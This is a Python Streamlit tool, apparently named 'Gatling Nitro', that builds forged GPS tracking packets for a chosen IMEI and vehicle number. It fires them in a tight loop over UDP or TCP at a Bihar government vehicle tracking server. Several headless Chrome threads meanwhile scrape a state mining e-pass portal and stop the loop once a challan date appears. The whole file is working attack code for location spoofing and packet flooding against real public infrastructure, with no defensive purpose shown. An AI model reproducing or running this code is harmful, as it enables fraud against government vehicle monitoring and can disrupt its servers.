import streamlit as st
import threading
import socket
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# --- Page Config ---
st.set_page_config(page_title="GATLING NITRO V82", page_icon="🚀", layout="wide")

st.title("🚀 VLTS GATLING NITRO - V82 (WEB)")
st.markdown("---")

# --- Session State Management ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0

# --- Sidebar Inputs ---
with st.sidebar:
    st.header("⚙️ Configuration")
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)
    threads = st.slider("CHROME THREADS", 1, 10, 6)

# --- Logic Functions ---
def generate_packet():
    now = datetime.now()
    d, t = now.strftime("%d%m%Y"), now.strftime("%H%M%S")
    return f"$PVT,{tag},{imei},{vno},1,{d},{t},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    p_bytes = generate_packet().encode('ascii')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    try:
        if mode == "TCP": sock.connect(target)
        while st.session_state.firing:
            sock.sendto(p_bytes, target) if mode == "UDP" else sock.send(p_bytes)
            st.session_state.total_count += 1
            time.sleep(0.001)
    except: pass
    finally: sock.close()

def scraper_engine():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    while st.session_state.firing:
        try:
            driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
            time.sleep(2)
            driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
            driver.execute_script("__doPostBack('btnSearch','');")
            time.sleep(5)
            res = driver.execute_script("""
                var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
            """)
            if res:
                st.toast(f"📡 Portal Update: {res}")
                if datetime.now().strftime("%d-%b-%Y").upper() in res.upper():
                    st.session_state.firing = False
                    st.success(f"✅ SESSION KILLED! Match: {res}")
                    break
        except: pass
        time.sleep(3)
    driver.quit()

# --- UI Layout ---
col1, col2 = st.columns(2)

with col1:
    if st.button("🔥 START ENGINE", use_container_width=True, disabled=st.session_state.firing):
        st.session_state.firing = True
        st.session_state.total_count = 0
        threading.Thread(target=firing_engine, daemon=True).start()
        for i in range(threads):
            threading.Thread(target=scraper_engine, daemon=True).start()
        st.rerun()

with col2:
    if st.button("🛑 STOP & RESET", use_container_width=True):
        st.session_state.firing = False
        st.session_state.total_count = 0
        st.rerun()

# --- Live Stats ---
st.metric("Packets Sent", st.session_state.total_count)
if st.session_state.firing:
    st.info("🚀 Sync Engine is currently firing and monitoring...")
    time.sleep(1)
    st.rerun()
